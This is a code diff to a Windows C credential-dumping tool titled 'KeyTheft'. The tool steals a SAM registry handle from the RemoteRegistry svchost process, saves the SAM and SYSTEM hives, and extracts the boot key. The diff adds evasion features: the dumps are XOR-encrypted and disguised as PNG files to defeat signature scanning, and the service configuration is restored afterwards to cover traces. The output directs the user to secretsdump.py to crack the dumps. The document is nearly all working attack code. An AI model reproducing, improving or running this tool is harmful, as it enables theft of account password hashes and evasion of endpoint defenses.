@@ -1,6 +1,17 @@
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <wchar.h>
+#include <io.h>
+#include <fcntl.h>
+
+#pragma comment(lib, "advapi32.lib")
+
 typedef LONG NTSTATUS;
 #define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
 
 #define SystemExtendedHandleInformation 64
 
@@ -33,10 +44,6 @@ typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
     SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
 } SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;
 
-/* ══════════════════════════════════════════════════════════════════════
- * NT API Function Pointers
- * ══════════════════════════════════════════════════════════════════════ */
-
 typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(
     ULONG, PVOID, ULONG, PULONG);
 typedef NTSTATUS (NTAPI *fn_NtDuplicateObject)(
@@ -56,30 +63,24 @@ static fn_NtClose                   pNtClose;
 static const WCHAR SAM_PATH[]   = L"\\REGISTRY\\MACHINE\\SAM";
 static const ULONG SAM_PATH_LEN = 21;
 
-
 static const BYTE PNG_SIG[8] = {
     0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A
 };
 
-/* Minimal valid IHDR: 1×1 pixel, RGBA, 8-bit */
 static const BYTE PNG_IHDR[25] = {
-    0x00,0x00,0x00,0x0D,           /* chunk data length = 13 */
-    0x49,0x48,0x44,0x52,           /* chunk type = "IHDR"    */
-    0x00,0x00,0x00,0x01,           /* width  = 1             */
-    0x00,0x00,0x00,0x01,           /* height = 1             */
-    0x08,                           /* bit depth = 8          */
-    0x06,                           /* color type = RGBA      */
-    0x00,0x00,0x00,                 /* compress/filter/intlce */
-    0x1F,0x15,0xC4,0x89            /* CRC32                  */
+    0x00,0x00,0x00,0x0D,
+    0x49,0x48,0x44,0x52,
+    0x00,0x00,0x00,0x01,
+    0x00,0x00,0x00,0x01,
+    0x08,
+    0x06,
+    0x00,0x00,0x00,
+    0x54,0x3F,0x55,0x64
 };
 
-#define PNG_HDR_SIZE  (sizeof(PNG_SIG) + sizeof(PNG_IHDR))  /* 33 */
+#define PNG_HDR_SIZE  (sizeof(PNG_SIG) + sizeof(PNG_IHDR))
 #define XOR_KEY_SIZE  16
 
-/*
- * DisguiseAsImage — Read plaintext hive, XOR encrypt, write as PNG.
- * Deletes the source file on success.
- */
 static BOOL DisguiseAsImage(LPCWSTR srcPath, LPCWSTR dstPath,
                              const BYTE xorKey[XOR_KEY_SIZE])
 {
@@ -104,11 +105,9 @@ static BOOL DisguiseAsImage(LPCWSTR srcPath, LPCWSTR dstPath,
     }
     CloseHandle(hIn);
 
-    /* XOR encrypt — breaks regf magic and all signature patterns */
     for (DWORD i = 0; i < dataSize; i++)
         data[i] ^= xorKey[i % XOR_KEY_SIZE];
 
-    /* Write PNG header + encrypted payload */
     HANDLE hOut = CreateFileW(dstPath, GENERIC_WRITE, 0, NULL,
         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hOut == INVALID_HANDLE_VALUE) {
@@ -117,14 +116,21 @@ static BOOL DisguiseAsImage(LPCWSTR srcPath, LPCWSTR dstPath,
     }
 
     DWORD wr;
-    WriteFile(hOut, PNG_SIG,  sizeof(PNG_SIG),  &wr, NULL);
-    WriteFile(hOut, PNG_IHDR, sizeof(PNG_IHDR), &wr, NULL);
-    WriteFile(hOut, data, dataSize, &wr, NULL);
+    BOOL ok = WriteFile(hOut, PNG_SIG,  sizeof(PNG_SIG),  &wr, NULL)
+           && wr == sizeof(PNG_SIG)
+           && WriteFile(hOut, PNG_IHDR, sizeof(PNG_IHDR), &wr, NULL)
+           && wr == sizeof(PNG_IHDR)
+           && WriteFile(hOut, data, dataSize, &wr, NULL)
+           && wr == dataSize;
     CloseHandle(hOut);
 
     HeapFree(GetProcessHeap(), 0, data);
 
-    /* Delete plaintext hive — only encrypted PNG remains */
+    if (!ok) {
+        DeleteFileW(dstPath);
+        return FALSE;
+    }
+
     DeleteFileW(srcPath);
 
     wprintf(L"  [+] %ls (%lu bytes)\n", dstPath,
@@ -132,9 +138,44 @@ static BOOL DisguiseAsImage(LPCWSTR srcPath, LPCWSTR dstPath,
     return TRUE;
 }
 
-/* ══════════════════════════════════════════════════════════════════════
- * Helpers
- * ══════════════════════════════════════════════════════════════════════ */
+static void GenXorKey(BYTE key[XOR_KEY_SIZE])
+{
+    fn_RtlGenRandom pRtlGenRandom = (fn_RtlGenRandom)
+        GetProcAddress(GetModuleHandleW(L"advapi32.dll"), "SystemFunction036");
+    if (pRtlGenRandom && pRtlGenRandom(key, XOR_KEY_SIZE)) return;
+
+    DWORD seed = GetTickCount() ^ (GetCurrentProcessId() << 16);
+    for (int i = 0; i < XOR_KEY_SIZE; i++) {
+        seed = seed * 1103515245 + 12345;
+        key[i] = (BYTE)(seed >> 16);
+    }
+}
+
+static BOOL WriteKeyFile(LPCWSTR dstPath, const BYTE key[XOR_KEY_SIZE])
+{
+    WCHAR keyPath[MAX_PATH];
+    _snwprintf(keyPath, MAX_PATH, L"%ls.key", dstPath);
+    keyPath[MAX_PATH - 1] = L'\0';
+
+    HANDLE h = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL,
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) return FALSE;
+
+    static const char HEXD[] = "0123456789abcdef";
+    char hex[XOR_KEY_SIZE * 2 + 2];
+    for (int i = 0; i < XOR_KEY_SIZE; i++) {
+        hex[i * 2]     = HEXD[key[i] >> 4];
+        hex[i * 2 + 1] = HEXD[key[i] & 0x0F];
+    }
+    hex[XOR_KEY_SIZE * 2]     = '\n';
+    hex[XOR_KEY_SIZE * 2 + 1] = '\0';
+
+    DWORD wr;
+    BOOL ok = WriteFile(h, hex, (DWORD)strlen(hex), &wr, NULL) &&
+              wr == (DWORD)strlen(hex);
+    CloseHandle(h);
+    return ok;
+}
 
 static BOOL InitNtApis(void)
 {
@@ -171,10 +212,6 @@ static BOOL EnablePriv(LPCWSTR name)
     return ok;
 }
 
-/* ══════════════════════════════════════════════════════════════════════
- * Key Type Index Detection
- * ══════════════════════════════════════════════════════════════════════ */
-
 static USHORT GetKeyTypeIndex(void)
 {
     HKEY hk;
@@ -185,7 +222,7 @@ static USHORT GetKeyTypeIndex(void)
     USHORT idx = 0;
     ULONG  sz  = 0x400000;
     PSYSTEM_HANDLE_INFORMATION_EX info = NULL;
-    NTSTATUS st;
+    NTSTATUS st = STATUS_INFO_LENGTH_MISMATCH;
 
     do {
         info = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(
@@ -198,7 +235,7 @@ static USHORT GetKeyTypeIndex(void)
             info = NULL;
             sz *= 2;
         }
-    } while (st == STATUS_INFO_LENGTH_MISMATCH);
+    } while (st == STATUS_INFO_LENGTH_MISMATCH && sz <= 0x40000000);
 
     if (NT_SUCCESS(st) && info) {
         DWORD myPid = GetCurrentProcessId();
@@ -214,10 +251,6 @@ static USHORT GetKeyTypeIndex(void)
     RegCloseKey(hk);
     return idx;
 }
-
-/* ══════════════════════════════════════════════════════════════════════
- * Core: Steal Handle + NtSaveKey
- * ══════════════════════════════════════════════════════════════════════ */
 
 static BOOL StealAndSave(
     DWORD   targetPid,
@@ -263,13 +296,24 @@ static BOOL StealAndSave(
     wprintf(L"  [*] Scanning %llu handles for PID %lu...\n",
         (unsigned long long)info->NumberOfHandles, targetPid);
 
-    HANDLE hStolen = NULL;
-    ULONG  checked = 0;
+    HANDLE hFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL,
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        wprintf(L"  [-] CreateFile(%ls) failed: %lu\n",
+            outputFile, GetLastError());
+        HeapFree(GetProcessHeap(), 0, info);
+        CloseHandle(hProc);
+        return FALSE;
+    }
 
-    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
+    BOOL found = FALSE;
+    ULONG checked = 0;
+
+    for (ULONG_PTR i = 0; i < info->NumberOfHandles && !found; i++) {
         SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX *e = &info->Handles[i];
         if (e->UniqueProcessId != (ULONG_PTR)targetPid)  continue;
         if (e->ObjectTypeIndex  != keyTypeIdx)            continue;
+        if (!(e->GrantedAccess & (KEY_READ | GENERIC_READ))) continue;
 
         HANDLE hDup = NULL;
         st = pNtDuplicateObject(hProc, (HANDLE)e->HandleValue,
@@ -277,9 +321,17 @@ static BOOL StealAndSave(
         if (!NT_SUCCESS(st) || !hDup) continue;
         checked++;
 
-        BYTE buf[2048];
-        ULONG resLen = 0;
-        st = pNtQueryKey(hDup, KeyNameInformation, buf, sizeof(buf), &resLen);
+        ULONG need = 0;
+        st = pNtQueryKey(hDup, KeyNameInformation, NULL, 0, &need);
+        if (st != STATUS_BUFFER_TOO_SMALL || !need) {
+            pNtClose(hDup);
+            continue;
+        }
+
+        BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, need);
+        if (!buf) { pNtClose(hDup); continue; }
+
+        st = pNtQueryKey(hDup, KeyNameInformation, buf, need, &need);
         if (NT_SUCCESS(st)) {
             PKEY_NAME_INFORMATION kni = (PKEY_NAME_INFORMATION)buf;
             ULONG chars = kni->NameLength / sizeof(WCHAR);
@@ -287,53 +339,54 @@ static BOOL StealAndSave(
                 _wcsnicmp(kni->Name, keyPath, keyPathLen) == 0) {
                 wprintf(L"  [+] FOUND %ls — handle 0x%llX access 0x%08lX\n",
                     label, (unsigned long long)e->HandleValue, e->GrantedAccess);
-                hStolen = hDup;
-                break;
+                st = pNtSaveKey(hDup, hFile);
+                if (NT_SUCCESS(st)) {
+                    found = TRUE;
+                } else {
+                    wprintf(L"  [!] NtSaveKey: 0x%08lX — trying next handle\n",
+                        (ULONG)st);
+                }
             }
         }
+        HeapFree(GetProcessHeap(), 0, buf);
         pNtClose(hDup);
     }
 
+    CloseHandle(hFile);
     HeapFree(GetProcessHeap(), 0, info);
     CloseHandle(hProc);
 
-    if (!hStolen) {
+    if (!found) {
         wprintf(L"  [-] %ls handle not found (%lu keys checked)\n",
             label, checked);
+        DeleteFileW(outputFile);
         return FALSE;
     }
 
-    HANDLE hFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL,
-        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        pNtClose(hStolen); return FALSE;
-    }
-
-    st = pNtSaveKey(hStolen, hFile);
-    CloseHandle(hFile);
-    pNtClose(hStolen);
-
-    if (NT_SUCCESS(st)) {
-        wprintf(L"  [+] %ls hive captured\n", label);
-        return TRUE;
-    }
-    wprintf(L"  [-] NtSaveKey: 0x%08lX\n", (ULONG)st);
-    DeleteFileW(outputFile);
-    return FALSE;
+    wprintf(L"  [+] %ls hive captured\n", label);
+    return TRUE;
 }
 
-/* ══════════════════════════════════════════════════════════════════════
- * RemoteRegistry Service → PID
- * ══════════════════════════════════════════════════════════════════════ */
-
-static DWORD GetServicePid(LPCWSTR svcName)
+static DWORD GetServicePid(LPCWSTR svcName, DWORD *origStart,
+                           BOOL *reconfigured, BOOL *startedByUs)
 {
+    *origStart     = 0;
+    *reconfigured  = FALSE;
+    *startedByUs   = FALSE;
+
     SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
     if (!hScm) return 0;
 
     SC_HANDLE hSvc = OpenServiceW(hScm, svcName,
-        SERVICE_QUERY_STATUS | SERVICE_START);
+        SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_QUERY_CONFIG |
+        SERVICE_CHANGE_CONFIG);
     if (!hSvc) { CloseServiceHandle(hScm); return 0; }
+
+    BYTE cfgBuf[4096];
+    QUERY_SERVICE_CONFIGW *cfg = (QUERY_SERVICE_CONFIGW *)cfgBuf;
+    DWORD cfgNeeded;
+    if (QueryServiceConfigW(hSvc, cfg, sizeof(cfgBuf), &cfgNeeded))
+        *origStart = cfg->dwStartType;
 
     SERVICE_STATUS_PROCESS ssp;
     DWORD needed;
@@ -345,17 +398,39 @@ static DWORD GetServicePid(LPCWSTR svcName)
 
     if (ssp.dwCurrentState != SERVICE_RUNNING) {
         if (!StartServiceW(hSvc, 0, NULL)) {
-            if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
-                wprintf(L"  [-] StartService: %lu\n", GetLastError());
+            DWORD err = GetLastError();
+            if (err == ERROR_SERVICE_DISABLED) {
+                if (!ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE,
+                        SERVICE_DEMAND_START, SERVICE_NO_CHANGE,
+                        NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
+                    wprintf(L"  [-] ChangeServiceConfig: %lu\n", GetLastError());
+                    CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
+                    return 0;
+                }
+                *reconfigured = TRUE;
+                if (!StartServiceW(hSvc, 0, NULL)) {
+                    wprintf(L"  [-] StartService: %lu\n", GetLastError());
+                    CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
+                    return 0;
+                }
+                *startedByUs = TRUE;
+            } else if (err != ERROR_SERVICE_ALREADY_RUNNING) {
+                wprintf(L"  [-] StartService: %lu\n", err);
                 CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
                 return 0;
             }
+        } else {
+            *startedByUs = TRUE;
         }
         for (int t = 0; t < 20; t++) {
             Sleep(250);
             QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                 (BYTE *)&ssp, sizeof(ssp), &needed);
             if (ssp.dwCurrentState == SERVICE_RUNNING) break;
+        }
+        if (ssp.dwCurrentState != SERVICE_RUNNING) {
+            CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
+            return 0;
         }
     }
 
@@ -365,9 +440,58 @@ static DWORD GetServicePid(LPCWSTR svcName)
     return pid;
 }
 
-/* ══════════════════════════════════════════════════════════════════════
- * Boot Key Extraction
- * ══════════════════════════════════════════════════════════════════════ */
+static void RestoreService(LPCWSTR svcName, DWORD origStart,
+                           BOOL reconfigured, BOOL startedByUs)
+{
+    if (!reconfigured && !startedByUs) return;
+
+    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+    if (!hScm) return;
+    SC_HANDLE hSvc = OpenServiceW(hScm, svcName, SERVICE_ALL_ACCESS);
+    if (!hSvc) {
+        wprintf(L"  [!] OpenService(restore): %lu\n", GetLastError());
+        CloseServiceHandle(hScm);
+        return;
+    }
+
+    if (startedByUs) {
+
+        WCHAR sysdir[MAX_PATH], cmd[MAX_PATH + 80];
+        GetSystemDirectoryW(sysdir, MAX_PATH);
+        _snwprintf(cmd, MAX_PATH + 79, L"\"%ls\\sc.exe\" stop %ls",
+            sysdir, svcName);
+        cmd[MAX_PATH + 78] = L'\0';
+
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
+                CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 10000);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        } else {
+            wprintf(L"  [!] sc.exe spawn failed: %lu\n", GetLastError());
+        }
+
+        SERVICE_STATUS_PROCESS ssp;
+        DWORD needed;
+        BOOL stopped = FALSE;
+        for (int t = 0; t < 20; t++) {
+            Sleep(250);
+            if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
+                    (BYTE *)&ssp, sizeof(ssp), &needed)) break;
+            if (ssp.dwCurrentState == SERVICE_STOPPED) { stopped = TRUE; break; }
+        }
+        if (!stopped)
+            wprintf(L"  [!] %ls still not stopped after restore\n", svcName);
+    }
+    if (reconfigured && origStart != SERVICE_DEMAND_START) {
+        ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE, origStart,
+            SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    }
+    CloseServiceHandle(hSvc);
+    CloseServiceHandle(hScm);
+}
 
 static BOOL ExtractBootKey(BYTE bootKey[16])
 {
@@ -382,6 +506,7 @@ static BOOL ExtractBootKey(BYTE bootKey[16])
         WCHAR path[256];
         _snwprintf(path, 256,
             L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\%ls", names[i]);
+        path[255] = L'\0';
         HKEY hk;
         if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0,
                 KEY_READ, &hk) != ERROR_SUCCESS)
@@ -408,12 +533,10 @@ static BOOL ExtractBootKey(BYTE bootKey[16])
     return TRUE;
 }
 
-/* ══════════════════════════════════════════════════════════════════════
- * Entry Point
- * ══════════════════════════════════════════════════════════════════════ */
-
 int wmain(int argc, wchar_t *argv[])
 {
+    _setmode(_fileno(stdout), _O_U8TEXT);
+
     wprintf(L"\n");
     wprintf(L"  ╔═══════════════════════════════════════════════════════╗\n");
     wprintf(L"  ║  KeyTheft, SAM Dump via RemoteRegistry Handle Theft ║\n");
@@ -423,12 +546,12 @@ int wmain(int argc, wchar_t *argv[])
     LPCWSTR samOut = (argc > 1) ? argv[1] : L"sam.png";
     LPCWSTR sysOut = (argc > 2) ? argv[2] : L"system.png";
 
-    /* Temp paths for NtSaveKey (plaintext hive, deleted after XOR) */
     WCHAR samTmp[MAX_PATH], sysTmp[MAX_PATH];
     _snwprintf(samTmp, MAX_PATH, L"%ls.tmp", samOut);
+    samTmp[MAX_PATH - 1] = L'\0';
     _snwprintf(sysTmp, MAX_PATH, L"%ls.tmp", sysOut);
+    sysTmp[MAX_PATH - 1] = L'\0';
 
-    /* ── Init ── */
     if (!InitNtApis()) {
         wprintf(L"[-] Failed to resolve ntdll exports\n");
         return 1;
@@ -450,19 +573,18 @@ int wmain(int argc, wchar_t *argv[])
     }
     wprintf(L"[+] Key type index: %u\n", keyType);
 
-    /* ═══════════════════════════════════════════════════════════════
-     * SAM — KeyProxy: steal from RemoteRegistry svchost
-     * ═══════════════════════════════════════════════════════════════ */
     wprintf(L"\n══ SAM hive (KeyProxy via RemoteRegistry) ══\n");
 
-    DWORD svcPid = GetServicePid(L"RemoteRegistry");
+    DWORD origStart = 0;
+    BOOL  svcReconf = FALSE, svcStarted = FALSE;
+    DWORD svcPid = GetServicePid(L"RemoteRegistry", &origStart,
+                                 &svcReconf, &svcStarted);
     if (!svcPid) {
         wprintf(L"  [-] RemoteRegistry service unavailable\n");
         return 1;
     }
     wprintf(L"  [+] RemoteRegistry svchost PID: %lu\n", svcPid);
 
-    /* Force svchost to open SAM via loopback RPC */
     HKEY hRemote = NULL;
     if (RegConnectRegistryW(L"\\\\localhost",
             HKEY_LOCAL_MACHINE, &hRemote) != ERROR_SUCCESS) {
@@ -478,16 +600,14 @@ int wmain(int argc, wchar_t *argv[])
     }
     wprintf(L"  [+] SAM opened via RemoteRegistry RPC\n");
 
-    /* Steal the handle from svchost → save to temp file */
     BOOL samOk = StealAndSave(svcPid, SAM_PATH, SAM_PATH_LEN,
                               samTmp, keyType, L"SAM");
 
     RegCloseKey(hSamRemote);
     RegCloseKey(hRemote);
 
-    /* ═══════════════════════════════════════════════════════════════
-     * SYSTEM hive, direct save (admin-readable) → temp file
-     * ═══════════════════════════════════════════════════════════════ */
+    RestoreService(L"RemoteRegistry", origStart, svcReconf, svcStarted);
+
     wprintf(L"\n══ SYSTEM hive ══\n");
     BOOL sysOk = FALSE;
     HKEY hSys;
@@ -509,33 +629,21 @@ int wmain(int argc, wchar_t *argv[])
         RegCloseKey(hSys);
     }
 
-    /* ═══════════════════════════════════════════════════════════════
-     * XOR encrypt + PNG disguise
-     * ═══════════════════════════════════════════════════════════════ */
     wprintf(L"\n══ Encoding output ══\n");
 
-    /* Generate random XOR key (advapi32!SystemFunction036 = RtlGenRandom) */
-    BYTE xorKey[XOR_KEY_SIZE];
-    fn_RtlGenRandom pRtlGenRandom = (fn_RtlGenRandom)
-        GetProcAddress(GetModuleHandleW(L"advapi32.dll"), "SystemFunction036");
-
-    if (pRtlGenRandom && pRtlGenRandom(xorKey, XOR_KEY_SIZE)) {
-        /* CSPRNG — good */
-    } else {
-        /* Fallback LCG (still breaks signatures, not crypto-grade) */
-        DWORD seed = GetTickCount() ^ (GetCurrentProcessId() << 16);
-        for (int i = 0; i < XOR_KEY_SIZE; i++) {
-            seed = seed * 1103515245 + 12345;
-            xorKey[i] = (BYTE)(seed >> 16);
-        }
+    if (samOk) {
+        BYTE samKey[XOR_KEY_SIZE];
+        GenXorKey(samKey);
+        samOk = DisguiseAsImage(samTmp, samOut, samKey);
+        if (samOk) WriteKeyFile(samOut, samKey);
+    }
+    if (sysOk) {
+        BYTE sysKey[XOR_KEY_SIZE];
+        GenXorKey(sysKey);
+        sysOk = DisguiseAsImage(sysTmp, sysOut, sysKey);
+        if (sysOk) WriteKeyFile(sysOut, sysKey);
     }
 
-    if (samOk) samOk = DisguiseAsImage(samTmp, samOut, xorKey);
-    if (sysOk) sysOk = DisguiseAsImage(sysTmp, sysOut, xorKey);
-
-    /* ═══════════════════════════════════════════════════════════════
-     * Boot key
-     * ═══════════════════════════════════════════════════════════════ */
     wprintf(L"\n══ Boot key ══\n");
     BYTE bootKey[16];
     if (ExtractBootKey(bootKey)) {
@@ -544,9 +652,6 @@ int wmain(int argc, wchar_t *argv[])
         wprintf(L"\n");
     }
 
-    /* ═══════════════════════════════════════════════════════════════
-     * Summary
-     * ═══════════════════════════════════════════════════════════════ */
     wprintf(L"\n╔══════════════════════════════════════════════════╗\n");
     wprintf(L"║  SAM:    %-40ls║\n", samOk  ? L"SUCCESS" : L"FAILED");
     wprintf(L"║  SYSTEM: %-40ls║\n", sysOk  ? L"SUCCESS" : L"FAILED");
@@ -554,21 +659,14 @@ int wmain(int argc, wchar_t *argv[])
     wprintf(L"╚══════════════════════════════════════════════════╝\n");
 
     if (samOk || sysOk) {
-        /* Print XOR key — SAVE THIS, required for decoding */
-        wprintf(L"\n  ┌─ XOR KEY (save this!) ─────────────────────┐\n");
-        wprintf(L"  │  ");
-        for (int i = 0; i < XOR_KEY_SIZE; i++) wprintf(L"%02x", xorKey[i]);
-        wprintf(L"  │\n");
-        wprintf(L"  └──────────────────────────────────────────────┘\n");
-
-        wprintf(L"\n  Decode:\n");
-        wprintf(L"    python3 decode.py ");
-        for (int i = 0; i < XOR_KEY_SIZE; i++) wprintf(L"%02x", xorKey[i]);
-        wprintf(L" %ls %ls\n", samOut, sysOut);
+        wprintf(L"\n  Decode (keys saved alongside outputs):\n");
+        if (samOk)
+            wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", samOut, samOut);
+        if (sysOk)
+            wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", sysOut, sysOut);
         wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv LOCAL\n\n");
     }
 
-    /* Cleanup stale temp files (no-op if already deleted by DisguiseAsImage) */
     DeleteFileW(samTmp);
     DeleteFileW(sysTmp);
 
